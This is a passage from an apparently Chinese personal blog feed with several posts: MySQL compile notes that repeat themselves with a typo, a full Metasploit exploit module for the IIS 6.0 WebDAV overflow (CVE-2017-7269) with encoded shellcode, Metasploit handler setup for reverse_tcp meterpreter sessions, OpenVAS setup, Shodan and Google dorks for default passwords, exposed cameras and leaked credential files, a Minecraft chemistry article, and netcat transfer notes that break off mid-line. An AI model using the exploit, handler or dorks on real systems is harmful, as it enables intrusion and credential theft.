        <content type="html"><![CDATA[<p>1、下载源码包 版本为 MySQL Community Server 5.6.35</p><p><a href="https://dev.mysql.com/downloads/mysql/5.6.html#downloads">https://dev.mysql.com/downloads/mysql/5.6.html#downloads</a></p><p>2、更新依赖</p><p>yum -y install gcc gcc-c++ cmake ncurses-devel autoconf perl perl-devel</p><p>3、解压安装包、1、下载源码包 版本为 MySQL Community Server 5.6.35 <a href="https://dev.mysql.com/downloads/mysql/5.6.html#downloads">https://dev.mysql.com/downloads/mysql/5.6.html#downloads</a> 2、更新依赖</p><p>yum -y install gcc gcc-c++ cmake ncurses-devel autoconf perl perl-devel</p><p>3、解压安装包、并考虑编译安装</p><p>tar -zxvf mysql-5.6.35.tar.gz<br>cd mysql-5.6.35<br>cmake .<br>-DCMAKE_INSTALL_PREFIX=/usr/local/mysql \<br>-DMYSQL_UNIX_ADDR=/usr/local/mysql/mysql.sock \<br>-DDEFAULT_CHARSET=utf8 \ 默认为 latin1 建议默认<br>-DDEFAULT_COLLATION=utf8_general_ci \ latin1 建议默认<br>-DEXTRA_CHARSETS=all \ //安装所有扩展字符集<br>-DMYSQL_DATADIR=/data/mysqldb \<br>-DMYSQL_TCP_PORT=3306 \<br>-DENABLE_DOWNLOADS=1 允许本地导入<br>make &amp;&amp; make install</p><p>4、设置目录权限</p><p>chown -R mysql.mysql</p><p>如果没有mysql用户需要创建</p><p>groupadd mysql<br>useradd -r -g mysql mysql</p><p>5、设置my.cnf文件 将/usr/local/mysql/support-files/my-default.cnf 移动到 /etc/my.cnf 如果为版本升级，可能会引起表结构改变，所以需要升级表结构</p><p>mysql_upgrade -u root -p</p><p>创建基础表：</p><p>cd /usr/local/mysql<br>./scripts/mysql_install_db –user=mysql</p><p>配置环境变量</p><p>vi /etc/profile</p><p>在最下面添加下面两个值</p><p>export MYSQL_HOME=”/usr/local/mysql”<br>export PATH=”$PATH:$MYSQL_HOME/bin”</p><p>然后保存 让修改的profile文件立即生效</p><p>source /etc/profile</p><p>升级完成后注意修改参数和错误日志。</p><p>master-info-repository=table # 可以使用set global 动态修改<br>select * from MySQL.slave_master_info;<br>relay-log-info-repository=table # 可以使用setglobal 动态修改<br>relay-log-recovery=1 # 只读参数，必须修改my.cnf重启mysql<br>#innodb_additional_mem_pool_size = 2M 这个已经过期</p><p>并考虑编译安装</p><p>tar -zxvf mysql-5.6.35.tar.gz<br>cd mysql-5.6.35<br>cmake .<br>-DCMAKE_INSTALL_PREFIX=/usr/local/mysql \<br>-DMYSQL_UNIX_ADDR=/usr/local/mysql/mysql.sock \<br>-DDEFAULT_CHARSET=utf8 \    默认为 latin1 建议默认<br>-DDEFAULT_COLLATION=utf8_general_ci \    latin1 建议默认<br>-DEXTRA_CHARSETS=all \  //安装所有扩展字符集<br>-DMYSQL_DATADIR=/data/mysqldb \<br>-DMYSQL_TCP_PORT=3306 \<br>-DENABLE_DOWNLOADS=1   允许本地导入<br>make &amp;&amp; make install</p><p>4、设置目录权限</p><p>chown -R mysql.mysql</p><p>如果没有mysql用户需要创建</p><p>groupadd mysql<br>useradd -r -g mysql mysql</p><p>5、设置my.cnf文件</p><p>将/usr/local/mysql/support-files/my-default.cnf  移动到 /etc/my.cnf</p><p>如果为版本升级，可能会引起表结构改变，所以需要升级表结构</p><p>mysql_upgrade -u root -p</p><p>创建基础表：</p><p>cd /usr/local/mysql<br>./scripts/mysql_install_db –user=mysql</p><p>配置环境变量</p><p>vi /etc/profile</p><p>在最下面添加下面两个值</p><p>export MYSQL_HOME=”/usr/local/mysql”<br>export PATH=”$PATH:$MYSQL_HOME/bin”</p><p>然后保存 让修改的profile文件立即生效</p><p>ource /etc/profile</p><p>升级完成后注意修改参数和错误日志。</p><p>master-info-repository=table # 可以使用set global 动态修改<br>select  *   from MySQL.slave_master_info;<br>relay-log-info-repository=table # 可以使用setglobal 动态修改<br>relay-log-recovery=1 # 只读参数，必须修改my.cnf重启mysql<br>#innodb_additional_mem_pool_size = 2M 这个已经过期</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IIS 6.0 WebDAV Overflow</title>
      <link href="3a611c8ee721/"/>
      <url>3a611c8ee721/</url>
      
        <content type="html"><![CDATA[<h1 id="cve-2017-7269-rb"><a href="#cve-2017-7269-rb" class="headerlink" title="\\cve-2017-7269.rb"></a><strong>\\cve-2017-7269.rb</strong></h1><p>require ‘msf/core’</p><p>class MetasploitModule &lt; Msf::Exploit::Remote<br>  Rank = GoodRanking</p><p>  include Msf::Exploit::Remote::Tcp</p><p>  def initialize(info = {})<br>    super(update_info(info,<br>      ‘Name’           =&gt; ‘CVE-2017-7269 Microsoft IIS WebDav ScStoragePathFromUrl Overflow’,<br>      ‘Description’    =&gt; %q{<br>          Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with “If: &lt;http://“ in a PROPFIND request, as exploited in the wild in July or August 2016.<br>          Original exploit by Zhiniang Peng and Chen Wu.<br>      },<br>      ‘Author’         =&gt; [<br>                            ‘Dominic Chell <a href="mailto:&#100;&#x6f;&#x6d;&#105;&#110;&#x69;&#99;&#x40;&#109;&#x64;&#x73;&#101;&#x63;&#46;&#x63;&#111;&#x2e;&#117;&#x6b;">&#100;&#x6f;&#x6d;&#105;&#110;&#x69;&#99;&#x40;&#109;&#x64;&#x73;&#101;&#x63;&#46;&#x63;&#111;&#x2e;&#117;&#x6b;</a>‘,#original module<br>                            ‘zcgonvh <a href="mailto:&#122;&#99;&#103;&#111;&#x6e;&#x76;&#x68;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#122;&#99;&#103;&#111;&#x6e;&#x76;&#x68;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;</a>‘#add option : PhysicalPathLength,HttpHost<br>                          ],<br>      ‘License’        =&gt; MSF_LICENSE,<br>      ‘References’     =&gt;<br>        [<br>          [ ‘CVE’, ‘CVE-2017-7269’],<br>          [ ‘BID’, ‘97127’],<br>          [ ‘URL’, ‘<a href="https://github.com/edwardz246003/IIS/_exploit&#39;\]">https://github.com/edwardz246003/IIS\_exploit&#39;\]</a>,<br>        ],<br>      ‘Privileged’     =&gt; false,<br>      ‘Payload’        =&gt;<br>        {<br>          ‘Space’       =&gt; 2000,<br>          ‘BadChars’    =&gt; “\x00”,<br>          ‘EncoderType’   =&gt; Msf::Encoder::Type::AlphanumUnicodeMixed,<br>          ‘DisableNops’  =&gt;  ‘True’,<br>          ‘EncoderOptions’ =&gt;<br>            {<br>              ‘BufferRegister’ =&gt; ‘ESI’,<br>            }<br>        },<br>      ‘DefaultOptions’ =&gt;<br>        {<br>          ‘EXITFUNC’ =&gt; ‘process’,<br>          ‘PrependMigrate’ =&gt; true,<br>          ‘PrependMigrateProc’ =&gt; “calc”<br>        },<br>      ‘Targets’        =&gt;<br>        [<br>          [<br>            ‘Microsoft Windows Server 2003 R2’,<br>            {<br>              ‘Platform’ =&gt; ‘win’,<br>            },<br>          ],<br>        ],<br>      ‘Platform’       =&gt; ‘win’,<br>      ‘DisclosureDate’ =&gt; ‘March 31 2017’,<br>      ‘DefaultTarget’ =&gt; 0))</p><pre><code>register\_options(  \[    Opt::RPORT(80),    OptInt.new(&#39;PhysicalPathLength&#39;, \[ true, &quot;length of physical path for target(include backslash)&quot;, 19\]),    OptString.new(&#39;HttpHost&#39;, \[ true, &#39;http host for target&#39;, &#39;localhost&#39; \])  \], self.class)</code></pre><p>  end</p><p>  def exploit<br>    connect</p><pre><code>http\_host=datastore\[&#39;HttpHost&#39;\] + &quot;:&quot; + datastore\[&#39;RPORT&#39;\].to\_sbuf1 = &quot;If: &lt;http://#&#123;http\_host&#125;/&quot;buf1 &lt;&lt; &quot;a&quot;\*(114-datastore\[&#39;PhysicalPathLength&#39;\])buf1 &lt;&lt; &quot;\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac&quot;buf1 &lt;&lt; &quot;&gt;&quot;buf1 &lt;&lt; &quot; (Not &lt;locktoken:write1&gt;) &lt;http://#&#123;http\_host&#125;/&quot;buf1 &lt;&lt; &quot;b&quot;\*(114-datastore\[&#39;PhysicalPathLength&#39;\])buf1 &lt;&lt; &quot;\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81&quot;buf1 &lt;&lt; payload.encodedsock.put(&quot;PROPFIND / HTTP/1.1\\r\\nHost: #&#123;http\_host&#125;\\r\\nContent-Length: 0\\r\\n#&#123;buf1&#125;&gt;\\r\\n\\r\\n&quot;)handlerdisconnect</code></pre><p>  end</p><p>end</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit Framework</title>
      <link href="359249428bd5/"/>
      <url>359249428bd5/</url>
      
        <content type="html"><![CDATA[<p>注意:使用前先</p><p>msfupdate</p><h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2><p>/usr/share/metasploit-framework/</p><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p>msf &gt; msfdb<br>[*] exec: msfdb<br>Manage a metasploit framework database</p><p>msfdb init # initialize the database<br>msfdb reinit # delete and reinitialize the database<br>msfdb delete # delete database and stop using it<br>msfdb start # start the database<br>msfdb stop # stop the database</p><p>建立数据库缓存</p><p>msf &gt; service postgresql start<br>msf &gt; db_rebuild_cache</p><h2 id="技术功能模块"><a href="#技术功能模块" class="headerlink" title="技术功能模块"></a>技术功能模块</h2><h3 id="Exploits-利用系统漏洞进行攻击的模块-对应每一个具体漏洞的攻击方法"><a href="#Exploits-利用系统漏洞进行攻击的模块-对应每一个具体漏洞的攻击方法" class="headerlink" title="Exploits   利用系统漏洞进行攻击的模块,对应每一个具体漏洞的攻击方法"></a>Exploits   利用系统漏洞进行攻击的模块,对应每一个具体漏洞的攻击方法</h3><h3 id="Payload-成功exploit之后-真正在目标系统执行的代码或者指令"><a href="#Payload-成功exploit之后-真正在目标系统执行的代码或者指令" class="headerlink" title="Payload   成功exploit之后,真正在目标系统执行的代码或者指令"></a>Payload   成功exploit之后,真正在目标系统执行的代码或者指令</h3><p>Single: all in one 体积较大,全功能</p><p>Stager: 体积较小,用于建立连接</p><p>Stages: 建立连接之后下载的后续payload</p><h3 id="Auxiliary-信息收集-指纹-扫描-枚举等功能的辅助模块"><a href="#Auxiliary-信息收集-指纹-扫描-枚举等功能的辅助模块" class="headerlink" title="Auxiliary   信息收集,指纹,扫描,枚举等功能的辅助模块"></a>Auxiliary   信息收集,指纹,扫描,枚举等功能的辅助模块</h3><h3 id="Encoders-对payload进行加密以躲避AV检查"><a href="#Encoders-对payload进行加密以躲避AV检查" class="headerlink" title="Encoders   对payload进行加密以躲避AV检查"></a>Encoders   对payload进行加密以躲避AV检查</h3><h3 id="Nops-提高payload稳定性及维持大小"><a href="#Nops-提高payload稳定性及维持大小" class="headerlink" title="Nops   提高payload稳定性及维持大小"></a>Nops   提高payload稳定性及维持大小</h3><p> </p><h2 id="MSF控制台命令"><a href="#MSF控制台命令" class="headerlink" title="MSF控制台命令"></a>MSF控制台命令</h2><p> </p><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>search name:mysql  path:scada  platform:aix type:aux author:aaron  cve:2011    可多条件同时搜索</p><p>search -h  帮助</p><h3 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h3><p>use 漏洞路径</p><p>– info  显示详细信息</p><p>– show options 显示可修改选项</p><p>–show payloads 显示可利用payloads</p><p>–show targets 显示可用目标</p><p>–show advanced 显示高级</p><p>–show evasion 显示躲避</p><p>–show missing  显示还剩什么没填完</p><p> </p><h3 id="set-参数"><a href="#set-参数" class="headerlink" title="set 参数"></a>set 参数</h3><p>set RHOST 192.168.8.117<br>set target //指定目标操作系统<br>unset //取消设置</p><h3 id="setg-参数"><a href="#setg-参数" class="headerlink" title="setg 参数"></a>setg 参数</h3><p>和set不同的是setg //set_global  全局设置</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>一些exploit漏洞需要注入payload达到渗透功能</p><p>-show payloads 显示适配的payload</p><p>-set payload 路径  选择payload</p><p>Exploit漏洞利用过程:  search到漏洞—-&gt;use 路径—-&gt;info查看信息以及show option—-&gt;set 参数—-&gt;set payload指定payload—-&gt;run 进行exploit</p><p> </p><h3 id="建立持续性监听端口"><a href="#建立持续性监听端口" class="headerlink" title="建立持续性监听端口"></a>建立持续性监听端口</h3><p>msf&gt;use exploit/multi/handler<br>msf&gt;set payload windows/meterpreter/reverse_tcp<br>msf&gt;set lhost <local IP><br>msf&gt;set lport <local port><br>msf&gt;set ExitOnSession false<br>msf&gt;exploit -j</p><p>-j选项能够让这个exploit以jobs的形式持续在后台运行。</p><p>set ExitOnSession false 能够让单个session退出时jobs不结束，同时可以维持多个sessions</p>]]></content>
      
      
      <categories>
          
          <category> metasploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Polycraft World ----Minecraft化学项目</title>
      <link href="900364932e37/"/>
      <url>900364932e37/</url>
      
        <content type="html"><![CDATA[<p>Minecraft不仅能实现不少化学实验，还能实现很多高级的化学合成过程。比如从石油原料开始制备喷气背囊燃料。一个德州的科学团队已经实现将化学课堂知识融入到Minecraft中。只需在游戏中增加Polycraft World模块即可。具体内容报道如下：化学版《我的世界》，寓教于乐的新高度！</p><p>寓教于乐是教育的最高境界。让课堂内容和网络游戏一样令学生痴迷是老师、家长们的愿望。近日，Nature Chemistry报道来自德州大学的科学家开发出一款基于视频游戏“Minecraft/我的世界”的化学类教育游戏。这个团队有一名材料学家、两名化学家和一名游戏设计IT专家组成。他们开发出适用于Minecraft的模块包“Polycraft World”。玩家在其中可以利用化学知识来创造各种物品，以增加游戏的娱乐性。比如：游戏玩家可以从天然橡胶制备出弹簧撬；甚至可以从原油开始提炼喷气背囊燃料。而这些过程会涉及到各方面化学专业知识，比如：蒸馏、化学合成、化学工艺等等。见下图</p><p><img src="/images/v2-9d4e1dbefd2aeaac0109bf965bdd9b87_b.png"></p><p>图 1</p><p><img src="/images/v2-e8753a19b09e5cf26eba4414e533ce3c_b.png"></p><p>图 2 团队首席Walter Voit博士说：我们的目标是证明可以寓教于游戏，并且有诸多优点。像“Polycraft World”这种给人身临其境的感觉而又强调合作的教育方式将很有可能代表着未来的教育的发展方向。</p><p>Polycraft World的开发需要多学科专业人士的参与。在这个项目中，化学系副教授Smaldone博士负责模块中化学知识和技术的正确性。化学系讲师，Thompson博士全程监督模块中研究课程的确定。Voit自己带领一批IT工程师负责程序的开发。经过一整年的努力，他们达到预期，成功构建出一个可以教授人们材料科学的复杂化学模块。Voit这样描述到：游戏难度的设置必须适中，太难则玩家容易受挫，太简单他们就会很快失去兴趣。游戏必须能够使玩家上瘾、让他们沉醉其中，又能够激发玩家的兴趣和斗志。</p><p>Thompson 和 Samldone为游戏设计出100多种聚合物。玩家可以从1000多种化学品出发，通过2000多种不同的路线合成出这些聚合物。Samldsone说：我们尽可能将minecraft这款游戏的原始特性，比如：建造、组装，植入到科学相关原理的设计中。在传统教学中，至少需要每周一小时的学习时间才能让一个非化学专业的人学会如何合成聚醚醚酮。但在这款游戏里，很多人能够无师自通。</p><p>Voit一直坚信Polycraft World将是未来教育的模式。这一教育方式的优点在于：可以实时监控学生的状态，比如：需要多长时间来实现一个化学过程？需要看多少次参考手册？这些数据都非常重要，我们可以利用这些数据来改善教育方式。</p><p>Samldone同样坚信这一点。在传统课堂式教育中，学生和老师的互动不够。而在这种寓教于乐的模式下。不仅仅是学生在学习，老师也在时刻监控着玩家的一举一动。这是一个巨大的创新。研究学生如何失败也是提高老师教学方式的一把利器。</p><p>Voit团队以化学领域为突破口，未来将扩展到很多领域。比如：经济学领域等等。</p><p> </p><p>文章链接：<a href="https://www.zhihu.com/question/27856778/answer/149126398">https://www.zhihu.com/question/27856778/answer/149126398</a></p><p>Polycraft项目官网: <a href="https://polycraft.utdallas.edu/">https://polycraft.utdallas.edu</a></p>]]></content>
      
      
      <categories>
          
          <category> minecraft项目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Openvas</title>
      <link href="5b57bac0de8e/"/>
      <url>5b57bac0de8e/</url>
      
        <content type="html"><![CDATA[<h2 id="安装配置OPENVAS"><a href="#安装配置OPENVAS" class="headerlink" title="安装配置OPENVAS"></a>安装配置OPENVAS</h2><h4 id="•-初始化安装"><a href="#•-初始化安装" class="headerlink" title="• 初始化安装"></a>• 初始化安装</h4><p>openvas-setup</p><h4 id="•-检查安装结果"><a href="#•-检查安装结果" class="headerlink" title="• 检查安装结果"></a>• 检查安装结果</h4><p>openvas-check-setup</p><h4 id="•-查看当前账号"><a href="#•-查看当前账号" class="headerlink" title="• 查看当前账号"></a>• 查看当前账号</h4><p>openvasmd–list-users</p><h4 id="•-修改账号密码"><a href="#•-修改账号密码" class="headerlink" title="• 修改账号密码"></a>• 修改账号密码</h4><p>openvasmd–user=admin –new-password=xxxxxxxx</p><h4 id="•升级"><a href="#•升级" class="headerlink" title="•升级"></a>•升级</h4><p>openvas-feed-update</p><p>vi /usr/bin/openvas-start • Starting OpenVas Services • Starting OpenVAS Manager: openvasmd • Starting OpenVAS Scanner: openvassd • Starting Greenbone Security Assistant: gsad</p><h2 id="使用OPENVAS"><a href="#使用OPENVAS" class="headerlink" title="使用OPENVAS"></a>使用OPENVAS</h2><h4 id="•-启动openvas"><a href="#•-启动openvas" class="headerlink" title="• 启动openvas"></a>• 启动openvas</h4><p>openvas-start</p><p> </p><h3 id="https-127-0-0-1-9392"><a href="#https-127-0-0-1-9392" class="headerlink" title="https://127.0.0.1:9392"></a><a href="https://127.0.0.1:9392/">https://127.0.0.1:9392</a></h3>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SHODAN</title>
      <link href="94a8a22e18c8/"/>
      <url>94a8a22e18c8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Shodan只搜网络设备。很多设备并不应该接入互联网，却由于本地网络管理员的疏忽和懒惰，直接插上网线便接入了与一般个人电脑相同的网络。比如汽车清洗机器，温度控制器，交通监控摄像头，加热系统，路由器，打印机，摄像头，服务器等。用户可以通过 <a href="http://www.shodanhq.com/">Shodan</a>搜索到这些不该连接互联网的设备，从大多数完全不设防的设备中获取关键信息进而获取控制权。黑客来可以通过 Shodan 来搜索防火墙薄弱的众多服务器来设置后门，使其变成其进行网络攻击的僵尸网络。</p><p><strong>Shodan搜索语法   #无账号默认十条搜索结果，用个人邮箱申请账号</strong></p><p>当确定目标公司，确定其主机名和子域名，并解析出来其的IP地址，则可使用Shodan去探测。</p><p>常见filter： net:192.168.20.1(192.168.20.0/24)  <strong>#知道目标网站IP，搜跟此IP在同一c段的主机开放哪些端口</strong> city country（CN、US） port（80、21、22、23） os:”windows” Hostname（主机或域名）:baidu.com</p><p>server:Apache</p><p> </p><p>强大搜索法：</p><p>200 OK country:JP</p><p>user:admin pass:password</p><p>linux upnp avtech                                    #摄像设备，通常默认密码</p><p>default password country:CN                  #默认密码</p><p><strong>二、Google Hacking</strong></p><p>1、搜索结果要求包含两个及两个以上关键字</p><p>一般搜索引擎需要在多个关键字之间加上” “，而 Google 用空格表示逻辑“与”，无需用明文的” “来表示。 2、搜索结果要求不包含某些特定信息</p><p>Google 用减号“-”表示逻辑“非”。A –B  表示搜索包含 A 但没有 B 的网页。</p><p>注：操作符与作用的关键字之间，不能有空格</p><p>3、搜索结果至少包含多个关键字中的任意一个</p><p>Google 用大写的“OR”表示逻辑“或”。如：A OR B</p><p>4、杂项语法</p><p>a.通配符问题</p></blockquote><blockquote><blockquote><p>大部分搜索引擎支持通配符号，如：“*”代表一连串字符，“?”代表单个字符等。Google只可以用“*”来替代单个字符。</p></blockquote></blockquote><blockquote><p>b.关键字的字母大小写问题</p></blockquote><blockquote><blockquote><p>Google搜索不分大小写</p></blockquote></blockquote><blockquote><p>c.搜索整个短语或者句子</p></blockquote><blockquote><blockquote><p>必须加英文引号，否则空格会被当作“与”操作符</p></blockquote></blockquote><blockquote><p>d.搜索引擎忽略的字符以及强制搜索</p></blockquote><blockquote><blockquote><p>Google 对一些网路上出现频率极高的英文单词，如“i”、“com”、“www”等，以及一些符号如“*”、“.”等，作忽略处理。需要在该关键字前加上明文的“+”号，进行强制搜索</p></blockquote><p>5、进阶搜索</p></blockquote><blockquote><p>a.对搜索的网站进行限制</p><blockquote><p>“site”表示搜索结果局限于某个具体网站或者网站频道，如“<a href="http://www.sina.com.cn”、“edu.sina.com.cn”,或者是某个域名,如“com.cn”、“com”等等.如果是要排除某网站或者域名范围内的页面,只需用“-网站/%E5%9F%9F%E5%90%8D%E2%80%9D%E3%80%82">www.sina.com.cn”、“edu.sina.com.cn”，或者是某个域名，如“com.cn”、“com”等等。如果是要排除某网站或者域名范围内的页面，只需用“-网站/域名”。</a></p></blockquote><blockquote><p>注：site 后的冒号为英文字符，而且，冒号后不能有空格，否则，“site:”将被作为一个搜索的关键字。此外，网站域名不能有“http://”前缀，也不能有任何“/”的目录后缀； 网站频道则只局限于“频道名.域名”方式， 而不能是“域名/频道名”方式。</p></blockquote></blockquote><blockquote><p>b.在某一类文件中查找信息</p></blockquote><blockquote><blockquote><p>Google 已经能检索的文档如:.xls、.ppt、.doc，.rtf，WordPerfect 文档，Lotus1-2-3 文档，Adobe 的.pdf 文档，ShockWave 的.swf 文档（Flash 动画）等.   #filetype:doc</p></blockquote></blockquote><blockquote><p>c.搜索的关键字包含在 URL 链接中</p></blockquote><blockquote><blockquote><p><strong>“inurl”语法返回的网页链接中包含第一个关键字</strong></p></blockquote><blockquote><p>很多网站把某一类具有相同属性的资源名称显示在目录名称或者网页名称中，比如“MP3”、“GALLARY”等，所以可以用 INURL 语法找到这些相关资源链接，然后，用第二个关键词确定是否有某项具体资料。INURL 语法和基本搜索语法的最大区别在于，前者通常能<strong>提供非常精确的专题资料。</strong></p></blockquote><blockquote><p><strong>“allinurl”语法返回的网页的链接中包含所有作用关键字。 这个查询的关键字只集中于网页的链接字符串。</strong></p></blockquote></blockquote><blockquote><p>d.搜索的关键字包含在网页标题中</p></blockquote><blockquote><blockquote><p>“intitle”和“allintitle”的用法类似于上面的inurl和allinurl， 只是后者对URL进行查询，而前者对网页的标题栏进行查询。网页标题，就是 HTML 标记语言 title 中之间的部分。</p></blockquote></blockquote><blockquote><p>f.搜索的关键字包含在网页的“锚”（anchor）链点内</p></blockquote><blockquote><blockquote><p>“inanchor”和“allincnchor”。“锚”，就是在同一个网页中快速切换链接点。</p></blockquote></blockquote><blockquote><p>6、罕用语法</p><p>a.搜索所有链接到某个 URL 地址的网页</p></blockquote><blockquote><blockquote><p>“link”：查找该网站被做了多少链接。</p></blockquote></blockquote><blockquote><blockquote><p>注：“link”不能与其他语法相混合操作，所以“link:”后面即使有空格，也将被Google 忽略。</p></blockquote></blockquote><blockquote><p>b.查找与某个页面结构内容相似的页面</p></blockquote><blockquote><blockquote><p>“related”用来搜索结构内容方面相似的网页.</p></blockquote></blockquote><blockquote><p>c.从 Google 服务器上缓存页面中查询信息</p></blockquote><blockquote><blockquote><p>“cache”用来搜索 Google 服务器上某页面的缓存， 通常用于查找某些已经被删除的死链接网页，相当于使用普通搜索结果页面中的“网页快照”功能。</p></blockquote><p>7、一些例子</p><p>北京的电子商务公司——北京 intitle:电子商务 intext:法人 intext:电话 阿里网站上的北京公司联系人——北京 site:alibaba.com inurl:contact 塞班司法案的PDF文档——SOX filetype:pdf 法国的支付相关页面——payment site:fr</p><p>inurl:”level/15/exec/-/show”                                  #在URL中有level/15/exec/-/show，思科设备，权限15 intitle:”netbotz appliance” “ok”                             #在标题栏，某特定类型的摄像头 inurl /admin/login.php                                          #找后台管理登录页面 inurl:qq.txt                                                            #qq账号密码 filetype:xls “username | password” inurl:ftp “password” filetype:xls site:baidu.com inurl:Service.pwd                                                #Frontpage的漏洞</p><p><a href="http://exploit-db.com/google-dorks">http://exploit-db.com/google-dorks</a>                       #google hacking例子，即Google大全</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NETCAT使用</title>
      <link href="a5c1375f9b40/"/>
      <url>a5c1375f9b40/</url>
      
        <content type="html"><![CDATA[<h2 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h2><p>nc –vn 1.1.1.1 110   // Telnet 1.1.1.1 的150端口<br>nc –vn 1.1.1.1 25     // -n  不做域名解析<br>nc –vn 1.1.1.1 80     //-v   显示详细信息</p><h2 id="NC——传输信息"><a href="#NC——传输信息" class="headerlink" title="NC——传输信息"></a>NC——传输信息</h2><p>A：nc -l -p 4444   // -l 侦听    -p 指定端口<br>B：nc –nv 1.1.1.1 4444   //连接1.1.1.1的4444端口</p><h3 id="传输信息"><a href="#传输信息" class="headerlink" title="传输信息"></a>传输信息</h3><p> </p><p>A: nc -l -p 4444<br>B: ls -l | nc -vn 1.1.1.1 4444  //将ls -l命令所输出的所有文本信息传输到A</p><p> </p><p>A: nc -l -p 4444 &gt; ls_info.txt  //将收到的所有文本信息保存在ls_info.txt文件中<br>B: ls -l | nc -vn 1.1.1.1 4444 -q 1  //发送完成信息之后Delay一秒退出,可以用来判断传输是否完成</p><p> </p><h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><p>B —-&gt;  A</p><p>A: nc -lp 4444 &gt; 1.mp4  